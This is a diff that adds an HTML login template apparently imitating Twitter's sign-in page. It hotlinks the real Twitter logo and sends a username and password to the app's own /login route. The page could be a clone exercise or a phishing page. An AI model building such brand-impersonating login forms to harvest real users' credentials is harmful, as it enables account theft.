@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Twitter Login</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
+</head>
+<body>
+    <div class="login-container">
+        <img src="https://abs.twimg.com/responsive-web/client-web/icon-ios.b1fc7275.png" alt="Twitter Logo" class="logo">
+        <h2>Sign in to Twitter</h2>
+        <form action="/login" method="POST">
+            <input type="text" name="username" placeholder="Phone, email, or username" required><br>
+            <input type="password" name="password" placeholder="Password" required><br>
+            <button type="submit">Log in</button>
+        </form>
+        <div class="loading-spinner" id="spinner"></div>
+    </div>
+</body>
+</html>
